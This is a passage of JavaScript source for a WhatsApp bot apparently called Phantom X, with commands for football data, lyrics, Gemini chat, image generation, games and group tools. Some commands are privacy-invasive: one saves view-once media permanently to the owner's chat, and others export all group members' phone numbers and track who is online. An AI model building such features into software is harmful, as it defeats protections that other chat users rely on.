                        try { await sock.presenceSubscribe(jid); } catch (_) {}
                    }
                    await delay(8000);
                    const online = members.filter(j => ["available", "composing", "recording"].includes(presenceTracker[j]));
                    const offline = members.filter(j => !online.includes(j));
                    if (cmd === ".listonline") {
                        const list = online.length ? online.map(j => `• +${j.split("@")[0]}`).join("\n") : "None detected online";
                        await reply(`🟢 *Online Members — ${meta.subject}*\n\n${list}\n\n_Note: Presence detection is approximate._`);
                    } else {
                        const list = offline.length ? offline.map(j => `• +${j.split("@")[0]}`).join("\n") : "All members appear online";
                        await reply(`🔴 *Offline Members — ${meta.subject}*\n\n${list}\n\n_Note: Presence detection is approximate._`);
                    }
                } catch (e) {
                    await reply(`❌ Failed: ${e?.message || "error"}`);
                }
                break;
            }

            // --- FOOTBALL COMMANDS ---
            case ".pltable": {
                await reply("⏳ Fetching Premier League table...");
                try { await reply(await getPLTable()); } catch (e) { await reply(`❌ Could not fetch table: ${e?.message}`); }
                break;
            }

            case ".live": {
                await reply("⏳ Fetching live scores...");
                try { await reply(await getLiveScores()); } catch (e) { await reply(`❌ Could not fetch scores: ${e?.message}`); }
                break;
            }

            case ".fixtures": {
                const team = parts.slice(1).join(" ").trim();
                if (!team) return reply("Usage: .fixtures <club name>\nExample: .fixtures Liverpool");
                await reply(`⏳ Fetching fixtures for *${team}*...`);
                try {
                    const result = await getClubFixtures(team);
                    if (!result) return reply(`❌ Club *${team}* not found in Premier League.`);
                    await reply(result);
                } catch (e) { await reply(`❌ Error: ${e?.message}`); }
                break;
            }

            case ".fnews": {
                const team = parts.slice(1).join(" ").trim();
                if (!team) return reply("Usage: .fnews <club name>\nExample: .fnews Arsenal");
                await reply(`⏳ Fetching news for *${team}*...`);
                try {
                    const result = await getClubNews(team);
                    if (!result) return reply(`❌ Club *${team}* not found in Premier League.`);
                    await reply(result);
                } catch (e) { await reply(`❌ Error: ${e?.message}`); }
                break;
            }

            case ".football": {
                const team = parts.slice(1).join(" ").trim();
                if (!team) {
                    return reply(
                        `⚽ *Premier League Commands:*\n\n` +
                        `• *.pltable* — PL standings table\n` +
                        `• *.live* — Live/today's PL scores\n` +
                        `• *.plweek* — This week's PL matches\n` +
                        `• *.fixtures <club>* — Club fixtures & results\n` +
                        `• *.fnews <club>* — Club latest news\n` +
                        `• *.football <club>* — Club full overview\n` +
                        `• *.h2h <club1> vs <club2>* — Head-to-head history\n\n` +
                        `_Example: .football Chelsea_\n` +
                        `_Example: .h2h Arsenal vs Liverpool_`
                    );
                }
                await reply(`⏳ Fetching info for *${team}*...`);
                try {
                    const [fixtures, news] = await Promise.allSettled([getClubFixtures(team), getClubNews(team)]);
                    const fx = fixtures.status === "fulfilled" ? fixtures.value : null;
                    const nw = news.status === "fulfilled" ? news.value : null;
                    if (!fx && !nw) return reply(`❌ Club *${team}* not found in Premier League. Try the full name (e.g. "Manchester United").`);
                    if (fx) await reply(fx);
                    if (nw) await reply(nw);
                } catch (e) { await reply(`❌ Error: ${e?.message}`); }
                break;
            }

            case ".plweek": {
                await reply("⏳ Fetching this week's Premier League matches...");
                try { await reply(await getPLWeekMatches()); }
                catch (e) { await reply(`❌ Could not fetch matches: ${e?.message}`); }
                break;
            }

            case ".h2h": {
                const h2hInput = parts.slice(1).join(" ").trim();
                const separator = h2hInput.toLowerCase().includes(" vs ") ? " vs " : h2hInput.includes("|") ? "|" : null;
                if (!separator) return reply(
                    `⚽ *Head to Head*\n\nUsage: *.h2h <club1> vs <club2>*\nExample: *.h2h Chelsea vs Arsenal*\n\nShows their last match result and next upcoming fixture.`
                );
                const [clubA, clubB] = h2hInput.split(new RegExp(separator, "i")).map(s => s.trim());
                if (!clubA || !clubB) return reply("❌ Please provide two club names.\nExample: .h2h Chelsea vs Arsenal");
                await reply(`⏳ Looking up *${clubA}* vs *${clubB}*...`);
                try {
                    const result = await getH2H(clubA, clubB);
                    if (result.error) return reply(`❌ ${result.error}`);
                    await reply(result.text);
                } catch (e) { await reply(`❌ Error: ${e?.message}`); }
                break;
            }

            // --- VIEW ONCE (reply to a view-once message with .viewonce) ---
            case ".viewonce": {
                const quoted = msg.message?.extendedTextMessage?.contextInfo?.quotedMessage;
                if (!quoted) return reply("👁️ Reply to a view-once message with *.viewonce* to reveal it.");
                const voMsg = quoted?.viewOnceMessage?.message || quoted?.viewOnceMessageV2?.message || quoted;
                const voType = getContentType(voMsg);
                try {
                    const fakeMsg = { ...msg, message: voMsg };
                    const buf = await downloadMediaMessage(fakeMsg, "buffer", {}, { logger: pino({ level: "silent" }) });
                    if (!buf || buf.length === 0) return reply("❌ Could not download media — the message may have expired.");
                    const ownerJid = (sock.user?.id || "").split(':')[0].split('@')[0] + "@s.whatsapp.net";
                    if (voType === "imageMessage") {
                        await sock.sendMessage(ownerJid, { image: buf, caption: `👁️ *View-once revealed*\n_Saved by Phantom X_` });
                        await reply("✅ View-once image sent to your private chat!");
                    } else if (voType === "videoMessage") {
                        await sock.sendMessage(ownerJid, { video: buf, caption: `👁️ *View-once revealed*\n_Saved by Phantom X_` });
                        await reply("✅ View-once video sent to your private chat!");
                    } else {
                        await reply("❌ Unsupported view-once type.");
                    }
                } catch (e) { await reply(`❌ Failed to reveal: ${e?.message}`); }
                break;
            }

            // --- SONG SEARCH ---
            case ".song": {
                const query = parts.slice(1).join(" ").trim();
                if (!query) return reply("Usage: .song <title> [artist]\nExample: .song Blinding Lights The Weeknd");
                await reply(`🎵 Searching for *${query}*...`);
                try {
                    const results = await searchSongs(query);
                    if (!results.length) return reply(`❌ No songs found for *${query}*.`);
                    let text = `🎵 *Search results for "${query}":*\n━━━━━━━━━━━━━━━━━━━\n`;
                    for (const s of results) {
                        const mins = Math.floor(s.trackTimeMillis / 60000);
                        const secs = String(Math.floor((s.trackTimeMillis % 60000) / 1000)).padStart(2, "0");
                        text += `\n🎧 *${s.trackName}*\n👤 ${s.artistName}\n💿 ${s.collectionName}\n⏱️ ${mins}:${secs}\n`;
                        if (s.previewUrl) text += `🔊 Preview: ${s.previewUrl}\n`;
                        text += `─────────────────\n`;
                    }
                    text += `\n_Use .lyrics <artist> | <title> to get lyrics_`;
                    await reply(text);
                } catch (e) { await reply(`❌ Song search failed: ${e?.message}`); }
                break;
            }

            // --- LYRICS ---
            case ".lyrics": {
                const lyricsInput = parts.slice(1).join(" ").trim();
                if (!lyricsInput.includes("|")) return reply("Usage: .lyrics <artist> | <song title>\nExample: .lyrics Burna Boy | Last Last");
                const [artist, title] = lyricsInput.split("|").map(s => s.trim());
                if (!artist || !title) return reply("Usage: .lyrics <artist> | <song title>");
                await reply(`🎤 Fetching lyrics for *${title}* by *${artist}*...`);
                try {
                    const lyrics = await getLyrics(artist, title);
                    if (!lyrics) return reply(`❌ Lyrics not found for *${title}* by *${artist}*.`);
                    const header = `🎤 *${title.toUpperCase()}*\n👤 ${artist}\n━━━━━━━━━━━━━━━━━━━\n\n`;
                    const fullText = header + lyrics;
                    // Split if too long (WhatsApp limit ~65000 chars)
                    if (fullText.length > 4000) {
                        await reply(fullText.slice(0, 4000) + "\n\n_(continued...)_");
                        if (fullText.length > 4000) await reply(fullText.slice(4000, 8000));
                    } else {
                        await reply(fullText);
                    }
                } catch (e) { await reply(`❌ Lyrics fetch failed: ${e?.message}`); }
                break;
            }

            // --- IMAGE GENERATION (Pollinations.ai - free, no API key) ---
            case ".imagine": {
                const rawPrompt = parts.slice(1).join(" ").trim();
                if (!rawPrompt) return reply(
                    `🎨 *Image Generator*\n\n` +
                    `Usage: *.imagine <description>*\n\n` +
                    `Examples:\n` +
                    `• _.imagine a lion wearing a crown at sunset_\n` +
                    `• _.imagine futuristic Lagos city at night_\n` +
                    `• _.imagine a rose made of ice_\n\n` +
                    `_Tip: The more specific your description, the better the image._`
                );
                const GEMINI_KEY = process.env.GEMINI_API_KEY;
                let finalPrompt = rawPrompt;
                if (GEMINI_KEY) {
                    try {
                        const gemBody = JSON.stringify({ contents: [{ parts: [{ text:
                            `You are an AI image prompt expert. The user wants to generate an image with this description: "${rawPrompt}"\n\n` +
                            `Rule 1 — If the description is clear and specific enough to generate an image (including medical, anatomical, scientific, realistic, or any other subject), respond with ONLY an improved, vivid, highly detailed image generation prompt (1-2 sentences). Be specific about lighting, style, and composition. Do not add any explanation or restrictions.\n\n` +
                            `Rule 2 — If the description is genuinely ambiguous and could mean very different images (e.g. "bride of barbados" could be a person, a flower, or something from Barbados), respond EXACTLY in this format:\n` +
                            `CLARIFY: <a short specific question to ask the user>\n\n` +
                            `Do NOT add anything else. Just the improved prompt or the CLARIFY line.`
                        }] }] });
                        const gemRes = await new Promise((resolve, reject) => {
                            const req = https.request({
                                hostname: "generativelanguage.googleapis.com",
                                path: `/v1beta/models/gemini-2.0-flash:generateContent?key=${GEMINI_KEY}`,
                                method: "POST",
                                headers: { "Content-Type": "application/json", "Content-Length": Buffer.byteLength(gemBody) },
                            }, res => { let d = ""; res.on("data", c => d += c); res.on("end", () => { try { resolve(JSON.parse(d)); } catch { reject(); } }); });
                            req.on("error", reject); req.write(gemBody); req.end();
                        });
                        const gemText = gemRes?.candidates?.[0]?.content?.parts?.[0]?.text?.trim();
                        if (gemText?.startsWith("CLARIFY:")) {
                            const question = gemText.replace("CLARIFY:", "").trim();
                            return reply(
                                `🎨 *Image Generator*\n\n` +
                                `Before I generate, I want to make sure I get this right:\n\n` +
                                `❓ _${question}_\n\n` +
                                `Reply with *.imagine <your clarification>* to continue.`
                            );
                        }
                        if (gemText) finalPrompt = gemText;
                    } catch (_) {}
                }
                await reply(`🎨 Generating your image...\n_"${rawPrompt}"_\n⏳ Please wait...`);
                try {
                    const imgUrl = buildImageGenUrl(finalPrompt);
                    const buf = await fetchBuffer(imgUrl);
                    await sock.sendMessage(from, { image: buf, caption: `🎨 *Generated Image*\n_${rawPrompt}_` }, { quoted: msg });
                } catch (e) {
                    try {
                        const fallbackUrl = buildImageGenUrl(rawPrompt);
                        const buf = await fetchBuffer(fallbackUrl);
                        await sock.sendMessage(from, { image: buf, caption: `🎨 *Generated Image*\n_${rawPrompt}_` }, { quoted: msg });
                    } catch (fallbackErr) {
                        await reply(`❌ Image generation failed: ${fallbackErr?.message || e?.message || "error"}`);
                    }
                }
                break;
            }

            // --- SCREENSHOT ---
            case ".ss":
            case ".screenshot": {
                const url = parts[1];
                if (!url) return reply("Usage: .ss <url>\nExample: .ss google.com");
                await reply(`📸 Taking screenshot of *${url}*...`);
                try {
                    const ssUrl = buildScreenshotUrl(url);
                    const buf = await fetchBuffer(ssUrl);
                    await sock.sendMessage(from, { image: buf, caption: `📸 Screenshot of ${url}` }, { quoted: msg });
                } catch (e) { await reply(`❌ Screenshot failed: ${e?.message}`); }
                break;
            }

            // --- AI CHAT (Google Gemini) ---
            case ".ai":
            case ".ask":
            case ".gemini": {
                const question = parts.slice(1).join(" ").trim();
                if (!question) return reply("Usage: .ai <your question>\nExample: .ai What is the capital of Nigeria?");
                const GEMINI_KEY = process.env.GEMINI_API_KEY;
                if (!GEMINI_KEY) return reply("⚠️ AI chat needs a free Gemini API key.\n\n1️⃣ Go to: https://aistudio.google.com/app/apikey\n2️⃣ Create a free key\n3️⃣ Add it as GEMINI_API_KEY in your hosting platform's environment variables (or in your .env file)");
                await reply("🤖 Thinking...");
                try {
                    const reqBody = JSON.stringify({ contents: [{ parts: [{ text: question }] }] });
                    const aiReply = await new Promise((resolve, reject) => {
                        const req = https.request({
                            hostname: "generativelanguage.googleapis.com",
                            path: `/v1beta/models/gemini-2.0-flash:generateContent?key=${GEMINI_KEY}`,
                            method: "POST",
                            headers: { "Content-Type": "application/json", "Content-Length": Buffer.byteLength(reqBody) },
                        }, (res) => {
                            let data = "";
                            res.on("data", c => data += c);
                            res.on("end", () => {
                                try {
                                    const parsed = JSON.parse(data);
                                    const text = parsed?.candidates?.[0]?.content?.parts?.[0]?.text || "No response";
                                    resolve(text);
                                } catch { reject(new Error("Parse error")); }
                            });
                        });
                        req.on("error", reject);
                        req.write(reqBody);
                        req.end();
                    });
                    await reply(`🤖 *Gemini AI:*\n\n${aiReply}`);
                } catch (e) { await reply(`❌ AI error: ${e?.message}`); }
                break;
            }

            // --- QUESTION SOLVER (image or text, all subjects) ---
            case ".solve":
            case ".answer": {
                const GEMINI_KEY = process.env.GEMINI_API_KEY;
                if (!GEMINI_KEY) return reply(
                    `⚠️ *.solve* needs a Gemini API key.\n\n` +
                    `Add *GEMINI_API_KEY* to your environment variables.\n` +
                    `Get a free key at: https://aistudio.google.com/app/apikey`
                );
                const quoted = msg.message?.extendedTextMessage?.contextInfo?.quotedMessage;
                const quotedType = quoted ? getContentType(quoted) : null;
                const cmdText = parts.slice(1).join(" ").trim();
                let questionText = cmdText;
                let imageBase64 = null;
                let imageMimeType = "image/jpeg";
                if (quoted) {
                    if (quotedType === "imageMessage") {
                        await reply("🔍 *Analyzing image...*\n⏳ Solving your question, please wait...");
                        try {
                            const fakeMsg = { ...msg, message: quoted };
                            const buf = await downloadMediaMessage(fakeMsg, "buffer", {}, { logger: pino({ level: "silent" }) });
                            imageBase64 = buf.toString("base64");
                            imageMimeType = quoted.imageMessage?.mimetype || "image/jpeg";
                        } catch (e) { return reply(`❌ Failed to read image: ${e?.message}`); }
                    } else {
                        const quotedTxt = quoted?.conversation || quoted?.extendedTextMessage?.text || "";
                        if (quotedTxt && !questionText) questionText = quotedTxt;
                    }
                }
                if (!imageBase64 && !questionText) {
                    return reply(
                        `🧠 *Question Solver*\n` +
                        `━━━━━━━━━━━━━━━━━━━━\n\n` +
                        `Solve questions from images or text using Gemini AI.\n\n` +
                        `*How to use:*\n` +
                        `1️⃣ Reply to a *photo of a question* with *.solve*\n` +
                        `2️⃣ Reply to a *text question* with *.solve*\n` +
                        `3️⃣ Type *.solve <your question>* directly\n\n` +
                        `*Subjects covered:*\n` +
                        `Math • Biology • Physics • Chemistry\n` +
                        `Government • Economics • English • Geography\n` +
                        `History • Literature • and more\n\n` +
                        `_If the image is unclear, the bot will ask for clarification._`
                    );
                }
                if (!imageBase64) await reply("🧠 *Solving your question...*\n⏳ Please wait...");
                try {
                    const systemPrompt =
                        `You are an expert academic tutor. Solve the question provided thoroughly and clearly.\n` +
                        `- Show step-by-step working where applicable.\n` +
                        `- Cover any subject: Math, Biology, Physics, Chemistry, Economics, Government, English, Geography, History, Literature, etc.\n` +
                        `- If it's from an image, extract the full question and solve it completely.\n` +
                        `- If part of the image is unclear or you cannot read a section, state what you can see and ask ONE specific clarifying question about the unclear part.\n` +
                        `- Format your answer clearly using numbered steps where needed.`;
                    let contents;
                    if (imageBase64) {
                        contents = [{ parts: [
                            { text: systemPrompt + (questionText ? `\n\nExtra context: ${questionText}` : "\n\nSolve the question in this image.") },
                            { inline_data: { mime_type: imageMimeType, data: imageBase64 } }
                        ]}];
                    } else {
                        contents = [{ parts: [{ text: `${systemPrompt}\n\nQuestion: ${questionText}` }] }];
                    }
                    const reqBody = JSON.stringify({ contents });
                    const answer = await new Promise((resolve, reject) => {
                        const req = https.request({
                            hostname: "generativelanguage.googleapis.com",
                            path: `/v1beta/models/gemini-2.0-flash:generateContent?key=${GEMINI_KEY}`,
                            method: "POST",
                            headers: { "Content-Type": "application/json", "Content-Length": Buffer.byteLength(reqBody) },
                        }, (res) => {
                            let data = "";
                            res.on("data", c => data += c);
                            res.on("end", () => {
                                try {
                                    const parsed = JSON.parse(data);
                                    resolve(parsed?.candidates?.[0]?.content?.parts?.[0]?.text || "No response received.");
                                } catch { reject(new Error("Parse error")); }
                            });
                        });
                        req.on("error", reject);
                        req.write(reqBody);
                        req.end();
                    });
                    await sock.sendMessage(from, {
                        text: `🧠 *Question Solver*\n━━━━━━━━━━━━━━━━━━━━\n\n${answer}`
                    }, { quoted: msg });
                } catch (e) { await reply(`❌ Solve failed: ${e?.message || "Unknown error"}`); }
                break;
            }

            // --- TIC-TAC-TOE ---
            case ".ttt": {
                if (!isGroup) return reply("Tic-Tac-Toe only works in groups.");
                const sub = parts[1]?.toLowerCase();
                if (sub === "stop" || sub === "end") {
                    delete gameState[from];
                    return reply("🛑 Tic-Tac-Toe game ended.");
                }
                const mentioned = msg.message?.extendedTextMessage?.contextInfo?.mentionedJid || [];
                if (mentioned.length < 2) return reply("Usage: .ttt @player1 @player2\n\nTag 2 players to start a game!");
                if (gameState[from]) return reply("⚠️ A game is already active. Use *.ttt stop* to end it.");
                gameState[from] = {
                    type: "ttt",
                    board: Array(9).fill(""),
                    players: [mentioned[0], mentioned[1]],
                    turn: 0,
                };
                await sock.sendMessage(from, {
                    text: `❌⭕ *Tic-Tac-Toe Started!*\n\n` +
                          `❌ @${mentioned[0].split("@")[0]} vs ⭕ @${mentioned[1].split("@")[0]}\n\n` +
                          `${renderTTTBoard(gameState[from].board)}\n\n` +
                          `👉 @${mentioned[0].split("@")[0]} goes first! Send a number *1-9* to make your move.`,
                    mentions: mentioned,
                });
                break;
            }

            // --- TRUTH OR DARE ---
            case ".truth": {
                const truth = TRUTHS[Math.floor(Math.random() * TRUTHS.length)];
                await reply(`🤔 *TRUTH:*\n\n_${truth}_`);
                break;
            }

            case ".dare": {
                const dare = DARES[Math.floor(Math.random() * DARES.length)];
                await reply(`😈 *DARE:*\n\n_${dare}_`);
                break;
            }

            // --- WORD CHAIN ---
            case ".wordchain": {
                if (!isGroup) return reply("Word Chain only works in groups.");
                const sub = parts[1]?.toLowerCase();
                if (sub === "stop" || sub === "end") {
                    delete gameState[from];
                    return reply("🛑 Word Chain game ended.");
                }
                if (gameState[from]) return reply("⚠️ A game is already active. Use *.wordchain stop* to end it first.");
                const startWord = parts[1] || "PHANTOM";
                const word = startWord.toLowerCase().replace(/[^a-z]/g, "");
                gameState[from] = { type: "wordchain", lastWord: word, usedWords: [word], lastPlayer: null };
                const nextLetter = word.slice(-1).toUpperCase();
                await reply(
                    `🔤 *Word Chain Started!*\n\n` +
                    `First word: *${word.toUpperCase()}*\n\n` +
                    `Next word must start with *${nextLetter}*\n` +
                    `Rules: No repeating words! Use *.wordchain stop* to end.`
                );
                break;
            }

            // --- PING ---
            case ".ping": {
                const start = Date.now();
                await sock.sendMessage(from, { text: "🏓 Pinging..." }, { quoted: msg });
                const latency = Date.now() - start;
                await reply(`✅ *Pong!*\n\n📶 *Latency:* ${latency}ms\n⏱️ *Uptime:* ${formatUptime()}`);
                break;
            }

            // --- T09 utilities ---
            case ".uptime": {
                const mu = process.memoryUsage();
                await reply(
                    `⏱️ *Bot Uptime*\n` +
                    `━━━━━━━━━━━━━━\n` +
                    `🕒 ${formatUptime()}\n` +
                    `🧠 RSS: ${(mu.rss / 1024 / 1024).toFixed(1)} MB\n` +
                    `📦 Heap: ${(mu.heapUsed / 1024 / 1024).toFixed(1)} / ${(mu.heapTotal / 1024 / 1024).toFixed(1)} MB\n` +
                    `🟢 PID: ${process.pid}`
                );
                break;
            }

            case ".linkedlist": {
                if (!isDevJid(senderJid) && !msg.key.fromMe) return reply("❌ Owner/dev only.");
                try {
                    const sessions = JSON.parse(fs.readFileSync("sessions.json", "utf8"));
                    const list = Object.keys(sessions);
                    if (!list.length) return reply("📭 No linked numbers right now.");
                    let out = `🔗 *Linked Numbers (${list.length})*\n━━━━━━━━━━━━━━\n`;
                    list.forEach((j, i) => { out += `${i + 1}. ${j.split("@")[0]}\n`; });
                    await reply(out);
                } catch { await reply("📭 No sessions file yet."); }
                break;
            }

            case ".slowmode": {
                if (!isGroup) return reply("Groups only.");
                const r = await getGroupRoles(sock, from);
                if (!msg.key.fromMe && !isDevJid(senderJid) && !r.admins.has(senderJid)) return reply("❌ Group admins only.");
                const sub = parts[1]?.toLowerCase();
                if (sub === "off") { setGroupSetting(from, "slowmode_seconds", 0); return reply("⏱️ Slowmode *OFF*."); }
                const secs = parseInt(sub, 10);
                if (!secs || secs < 1 || secs > 3600) return reply("Usage: .slowmode <seconds>  |  .slowmode off\nExample: .slowmode 15");
                setGroupSetting(from, "slowmode_seconds", secs);
                await reply(`⏱️ Slowmode set to *${secs}s* per user.`);
                break;
            }

            case ".warnings": {
                if (!isGroup) return reply("Groups only.");
                const target = resolveTargetJid(msg, parts) || senderJid;
                let warns = {};
                try { warns = JSON.parse(fs.readFileSync("warns.json", "utf8")); } catch {}
                const count = warns?.[from]?.[target] || 0;
                await reply(`⚠️ @${target.split("@")[0]} has *${count}/3* warnings.`, { mentions: [target] });
                break;
            }

            case ".shorten": {
                const url = parts[1];
                if (!url || !/^https?:\/\//i.test(url)) return reply("Usage: .shorten <url>");
                try {
                    const short = await new Promise((res, rej) => {
                        https.get(`https://is.gd/create.php?format=simple&url=${encodeURIComponent(url)}`,
                            r => { let d = ""; r.on("data", c => d += c); r.on("end", () => res(d.trim())); }
                        ).on("error", rej);
                    });
                    if (short && short.startsWith("http")) await reply(`🔗 *Shortened:*\n${short}`);
                    else await reply(`❌ Could not shorten. (${short})`);
                } catch (e) { await reply("❌ Shorten service unreachable."); }
                break;
            }

            case ".expand": {
                const url = parts[1];
                if (!url || !/^https?:\/\//i.test(url)) return reply("Usage: .expand <short-url>");
                try {
                    const final = await new Promise((res, rej) => {
                        const u = new URL(url);
                        const mod = u.protocol === "https:" ? https : http;
                        const req = mod.request({ method: "HEAD", host: u.hostname, path: u.pathname + u.search }, r => {
                            res(r.headers.location || url);
                        });
                        req.on("error", rej); req.end();
                    });
                    await reply(`🔍 *Resolves to:*\n${final}`);
                } catch { await reply("❌ Could not resolve."); }
                break;
            }

            case ".qrtext": {
                const text = parts.slice(1).join(" ");
                if (!text) return reply("Usage: .qrtext <text or url>");
                try {
                    const qrUrl = `https://api.qrserver.com/v1/create-qr-code/?size=400x400&data=${encodeURIComponent(text)}`;
                    const buf = await fetchBuffer(qrUrl);
                    await sock.sendMessage(from, { image: buf, caption: `📲 *QR for:* ${text}` }, { quoted: msg });
                } catch { await reply("❌ QR generator unreachable."); }
                break;
            }

            case ".scanqr": {
                const ctx = msg.message?.extendedTextMessage?.contextInfo;
                const quoted = ctx?.quotedMessage;
                const imgMsg = quoted?.imageMessage || msg.message?.imageMessage;
                if (!imgMsg) return reply("Reply to an image of a QR code with .scanqr");
                try {
                    const stream = await downloadContentFromMessage(imgMsg, "image");
                    let buf = Buffer.from([]);
                    for await (const ch of stream) buf = Buffer.concat([buf, ch]);
                    const tmp = `/tmp/qr_${Date.now()}.jpg`;
                    fs.writeFileSync(tmp, buf);
                    const result = await new Promise((res, rej) => {
                        const form = `--bnd\r\nContent-Disposition: form-data; name="file"; filename="qr.jpg"\r\nContent-Type: image/jpeg\r\n\r\n`;
                        const tail = `\r\n--bnd--\r\n`;
                        const body = Buffer.concat([Buffer.from(form), buf, Buffer.from(tail)]);
                        const req = https.request({
                            host: "api.qrserver.com", path: "/v1/read-qr-code/", method: "POST",
                            headers: { "Content-Type": "multipart/form-data; boundary=bnd", "Content-Length": body.length }
                        }, r => { let d = ""; r.on("data", c => d += c); r.on("end", () => res(d)); });
                        req.on("error", rej); req.write(body); req.end();
                    });
                    fs.unlinkSync(tmp);
                    const parsed = JSON.parse(result);
                    const data = parsed?.[0]?.symbol?.[0]?.data;
                    if (data) await reply(`📲 *QR contents:*\n${data}`);
                    else await reply(`❌ Could not read QR (${parsed?.[0]?.symbol?.[0]?.error || "unknown"}).`);
                } catch (e) { await reply(`❌ Scan failed: ${e.message}`); }
                break;
            }

            case ".getvcf": {
                if (!isGroup) return reply("Groups only.");
                const r = await getGroupRoles(sock, from);
                if (!msg.key.fromMe && !isDevJid(senderJid) && !r.admins.has(senderJid)) return reply("❌ Group admins only.");
                try {
                    const meta = r.meta || await sock.groupMetadata(from);
                    let vcf = "";
                    meta.participants.forEach((p, i) => {
                        const num = p.id.split("@")[0];
                        vcf += `BEGIN:VCARD\nVERSION:3.0\nFN:${meta.subject} ${i + 1}\nTEL;type=CELL;type=VOICE;waid=${num}:+${num}\nEND:VCARD\n`;
                    });
                    const path = `/tmp/${meta.subject.replace(/\W+/g, "_")}.vcf`;
                    fs.writeFileSync(path, vcf);
                    await sock.sendMessage(from, {
                        document: fs.readFileSync(path),
                        mimetype: "text/x-vcard",
                        fileName: `${meta.subject}.vcf`
                    }, { quoted: msg });
                    fs.unlinkSync(path);
                } catch (e) { await reply(`❌ ${e.message}`); }
                break;
            }

            // --- T10: AFK ---
            case ".afk": {
                const reason = parts.slice(1).join(" ").trim() || "AFK";
                setAfk(senderJid, reason);
                await reply(`💤 @${senderJid.split("@")[0]} is now AFK.\nReason: ${reason}`, { mentions: [senderJid] });
                break;
            }
            case ".unafk":
            case ".back": {
                if (!getAfk(senderJid)) return reply("You're not marked AFK.");
                clearAfk(senderJid);
                await reply(`👋 Welcome back @${senderJid.split("@")[0]}!`, { mentions: [senderJid] });
                break;
            }

            // --- T11: profile / rank ---
            case ".profile": {
                if (!isGroup) return reply("Groups only.");
                const target = resolveTargetJid(msg, parts) || senderJid;
                const stats = loadStats()?.[from] || {};
                const myCount = stats[target] || 0;
                const sorted = Object.entries(stats).sort((a, b) => b[1] - a[1]);
                const rankIdx = sorted.findIndex(([j]) => j === target);
                const rank = rankIdx >= 0 ? rankIdx + 1 : "—";
                const total = sorted.length;
                const a = getAfk(target);
                let pp = null;
                try { pp = await sock.profilePictureUrl(target, "image"); } catch {}
                const txt =
                    `👤 *Profile*\n━━━━━━━━━━━━\n` +
                    `Name: @${target.split("@")[0]}\n` +
                    `Messages here: *${myCount}*\n` +
                    `Rank in group: *${rank}/${total}*\n` +
                    `Status: ${a ? `💤 AFK — ${a.reason}` : "🟢 Active"}`;
                if (pp) {
                    try {
                        const buf = await fetchBuffer(pp);
                        return await sock.sendMessage(from, { image: buf, caption: txt, mentions: [target] }, { quoted: msg });
                    } catch {}
                }
                await reply(txt, { mentions: [target] });
                break;
            }

            case ".rank":
            case ".leaderboard": {
                if (!isGroup) return reply("Groups only.");
                const stats = loadStats()?.[from] || {};
                const sorted = Object.entries(stats).sort((a, b) => b[1] - a[1]).slice(0, 10);
                if (!sorted.length) return reply("📊 No stats yet for this group.");
                let out = `🏆 *Top 10 Active Members*\n━━━━━━━━━━━━━━\n`;
                const mentions = [];
                sorted.forEach(([j, c], i) => {
                    out += `${i + 1}. @${j.split("@")[0]} — ${c} msgs\n`;
                    mentions.push(j);
                });
                await reply(out, { mentions });
                break;
            }

            case ".geolocate": {
                const ip = parts[1];
                if (!ip) return reply("Usage: .geolocate <ip-or-domain>");
                try {
                    const data = await fetchJSON(`https://ipwho.is/${encodeURIComponent(ip)}`);
                    if (!data.success) return reply(`❌ ${data.message || "Lookup failed"}`);
                    await reply(
                        `🌍 *Geolocation*\n━━━━━━━━━━\n` +
                        `IP: ${data.ip}\n` +
                        `Country: ${data.country} ${data.country_code}\n` +
                        `Region: ${data.region}\n` +
                        `City: ${data.city}\n` +
                        `ISP: ${data.connection?.isp || "?"}\n` +
                        `Lat/Lng: ${data.latitude}, ${data.longitude}\n` +
                        `Timezone: ${data.timezone?.id || "?"}`
                    );
                } catch (e) { await reply(`❌ ${e.message}`); }
                break;
            }

            // --- CALCULATOR ---
            case ".calc": {
                const expr = parts.slice(1).join("").replace(/[^0-9+\-*/.%()\s]/g, "");
                if (!expr) return reply("Usage: .calc 5 * 3 + 2");
                try { await reply(`🧮 *${expr} = ${eval(expr)}*`); } catch { await reply("❌ Invalid expression."); }
                break;
            }

            // --- COIN FLIP ---
            case ".flip": {
                await reply(`🪙 *${Math.random() < 0.5 ? "HEADS" : "TAILS"}!*`);
                break;
            }

            // --- DICE ---
            case ".dice": {
                const sides = parseInt(parts[1]) || 6;
                const roll = Math.floor(Math.random() * sides) + 1;
                await reply(`🎲 Rolled a *${sides}-sided die*: *${roll}!*`);
                break;
            }

            // --- MAGIC 8-BALL ---
            case ".8ball": {
                const q = parts.slice(1).join(" ").trim();
                if (!q) return reply("Usage: .8ball Will I win today?");
                const ans = EIGHTBALL[Math.floor(Math.random() * EIGHTBALL.length)];
                await reply(`🎱 *Question:* _${q}_\n\n🎱 *Answer:* ${ans}`);
                break;
            }

            // --- ROCK PAPER SCISSORS ---
            case ".rps": {
                const choices = { rock: "🪨", paper: "📄", scissors: "✂️" };
                const wins = { rock: "scissors", paper: "rock", scissors: "paper" };
                const user = parts[1]?.toLowerCase();
                if (!choices[user]) return reply("Usage: .rps rock/paper/scissors");
                const bot = Object.keys(choices)[Math.floor(Math.random() * 3)];
                let result = user === bot ? "🤝 It's a *draw*!" : wins[user] === bot ? "🎉 You *win*!" : "😈 You *lose*!";
                await reply(`✊ *Rock Paper Scissors!*\n\nYou: ${choices[user]} *${user}*\nMe: ${choices[bot]} *${bot}*\n\n${result}`);
                break;
            }

            // --- SLOTS ---
            case ".slots": {
                const sym = ["🍒","🍋","🍊","🍇","⭐","💎","🔔"];
                const r = [sym[Math.floor(Math.random()*7)], sym[Math.floor(Math.random()*7)], sym[Math.floor(Math.random()*7)]];
                const won = r[0]===r[1] && r[1]===r[2];
                await reply(`🎰 *SLOTS!*\n\n┌─────────────┐\n│  ${r[0]}  │  ${r[1]}  │  ${r[2]}  │\n└─────────────┘\n\n${won ? "🎉 *JACKPOT! You win!* 💰" : r[0]===r[1]||r[1]===r[2]||r[0]===r[2] ? "✨ *Two of a kind!* Almost there..." : "❌ No match. Try again!"}`);
                break;
            }

            // --- TRIVIA ---
            case ".trivia": {
                if (triviaState[from]) {
                    const t = triviaState[from];
                    const guess = parts.slice(1).join(" ").trim().toLowerCase();
                    if (!guess) return reply(`❓ *Question:* _${t.q}_\n\n💡 Hint: ${t.hint}\n\nType *.trivia <answer>* to answer!`);
                    if (guess === t.a) {
                        delete triviaState[from];
                        return reply(`✅ *CORRECT!* 🎉\n\nThe answer was: *${t.a}*`);
                    } else {
                        return reply(`❌ Wrong! Try again or type *.trivia skip* to skip.`);
                    }
